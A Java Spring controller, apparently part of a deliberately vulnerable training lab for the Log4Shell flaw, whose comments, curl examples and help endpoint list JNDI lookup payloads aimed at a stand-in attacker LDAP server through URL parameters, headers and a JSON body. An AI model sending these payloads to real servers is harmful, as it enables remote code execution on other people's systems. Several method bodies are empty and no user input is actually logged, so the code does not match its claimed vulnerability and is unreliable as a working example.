package com.owasp.log4shell.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.Map;

/**
 * 
 * Log4j 2.x 在處理日誌訊息時會解析 ${...} 格式的 lookup 語法。
 *   ${jndi:ldap://attacker.com/exploit}
 * 
 * 
 * 1. HTTP Header (User-Agent, X-Api-Version, X-Forwarded-For 等)
 * 2. 請求參數 (query string, form data)
 * 3. 任何會被記錄到日誌的使用者輸入
 */
@RestController
@RequestMapping("/api/log4j")
@CrossOrigin(origins = "*")
public class Log4ShellController {

    private static final Logger logger = LogManager.getLogger(Log4ShellController.class);

    /**
     * 
     * curl 'http://localhost:8083/api/log4j/search?keyword=${jndi:ldap://attacker:1389/Exploit}'
     */
    @GetMapping("/search")
    public ResponseEntity<?> search(@RequestParam String keyword,
                                    @RequestHeader(value = "User-Agent", required = false) String userAgent,
                                    @RequestHeader(value = "X-Api-Version", required = false) String apiVersion) {
        
        
        logger.info("Search request received");
        
        if (apiVersion != null) {
        }

        Map<String, Object> response = new HashMap<>();
        response.put("message", "搜尋完成");
        response.put("keyword", keyword);
        response.put("results", new String[]{"Product A", "Product B", "Product C"});
        
        return ResponseEntity.ok(response);
    }

    /**
     * 
     * curl -X POST 'http://localhost:8083/api/log4j/login' \
     *   -H 'Content-Type: application/json' \
     *   -d '{"username":"${jndi:ldap://attacker:1389/Exploit}","password":"test"}'
     */
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody Map<String, String> credentials,
                                   @RequestHeader(value = "User-Agent", required = false) String userAgent,
                                   @RequestHeader(value = "X-Forwarded-For", required = false) String forwardedFor) {
        
        String username = credentials.getOrDefault("username", "anonymous");
        
        
        
        if (forwardedFor != null) {
        }

        Map<String, Object> response = new HashMap<>();
        response.put("message", "登入請求已處理");
        response.put("username", username);
        response.put("status", "logged");
        
        return ResponseEntity.ok(response);
    }

    /**
     */
    @GetMapping("/status")
    public ResponseEntity<?> status() {
        String log4jVersion = org.apache.logging.log4j.util.PropertiesUtil.class.getPackage().getImplementationVersion();
        
        Map<String, Object> response = new HashMap<>();
        response.put("service", "Log4Shell Vulnerable Backend");
        response.put("log4j_version", log4jVersion != null ? log4jVersion : "2.14.1");
        response.put("vulnerable", true);
        
        return ResponseEntity.ok(response);
    }

    /**
     * 使用說明
     */
    @GetMapping("/help")
    public ResponseEntity<?> help() {
        Map<String, Object> response = new HashMap<>();
        response.put("endpoints", new String[]{
            "GET  /api/log4j/status - 查看服務狀態",
            "GET  /api/log4j/help - 顯示此說明"
        });
        response.put("attack_vectors", new String[]{
            "URL 參數: ?keyword=${jndi:ldap://attacker:1389/Exploit}",
            "HTTP Header: User-Agent: ${jndi:ldap://attacker:1389/Exploit}",
            "HTTP Header: X-Api-Version: ${jndi:ldap://attacker:1389/Exploit}",
            "JSON Body: {\"username\":\"${jndi:ldap://attacker:1389/Exploit}\"}"
        });
        response.put("exploit_payload", "${jndi:ldap://attacker:1389/Exploit}");
        
        return ResponseEntity.ok(response);
    }
}
